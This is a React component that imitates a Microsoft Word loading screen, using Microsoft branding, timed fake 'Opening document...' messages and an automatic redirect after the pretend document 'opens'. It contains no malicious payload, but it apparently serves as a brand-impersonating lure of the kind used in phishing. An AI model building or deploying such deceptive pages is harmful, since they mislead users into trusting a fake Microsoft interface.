import React, { useEffect, useState } from 'react';
import WordIcon from '../assets/Word.svg';
import styles from './MessageIconLanding.module.css';

interface MessageIconLandingProps {
  onOpenMessage: () => void;
}

const MessageIconLanding: React.FC<MessageIconLandingProps> = ({ onOpenMessage }) => {
  const [isLoading, setIsLoading] = useState(true);
  const [loadingText, setLoadingText] = useState('Opening document...');

  useEffect(() => {
    // Simulate realistic Word document loading sequence
    const loadingSequence = [
      { text: 'Opening document...', delay: 0 },
      { text: 'Loading content...', delay: 1000 },
      { text: 'Preparing document...', delay: 2000 },
      { text: 'Almost ready...', delay: 2500 }
    ];

    loadingSequence.forEach(({ text, delay }) => {
      setTimeout(() => {
        setLoadingText(text);
      }, delay);
    });

    // Finish loading after realistic time
    const loadingTimer = setTimeout(() => {
      setIsLoading(false);
    }, 3000);

    // Auto-redirect after document "opens"
    const redirectTimer = setTimeout(() => {
      onOpenMessage();
    }, 3500);

    return () => {
      clearTimeout(loadingTimer);
      clearTimeout(redirectTimer);
    };
  }, [onOpenMessage]);

  return (
    <div className={styles.container}>
      <div className={styles.contentWrapper}>
        <div className={styles.logoSection}>
          <div className={styles.floatingWordLogo}>
            <img 
              src={WordIcon} 
              alt="Microsoft Word" 
              className={styles.wordIcon}
            />
          </div>
          <h1 className={styles.wordTitle}>Microsoft Word</h1>
          
          {/* Realistic loading text */}
          {isLoading && (
            <div className={styles.loadingTextContainer}>
              <p className={styles.loadingText}>{loadingText}</p>
              <div className={styles.loadingSpinner}></div>
            </div>
          )}
          
          {/* Document ready state */}
          {!isLoading && (
            <div className={styles.documentReady}>
              <p className={styles.readyText}>Document ready</p>
            </div>
          )}
        </div>
        
        <div className={styles.microsoftLogoSection}>
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png" 
            alt="Microsoft Logo" 
            className={styles.microsoftLogo}
          />
        </div>
      </div>
    </div>
  );
};

export default MessageIconLanding;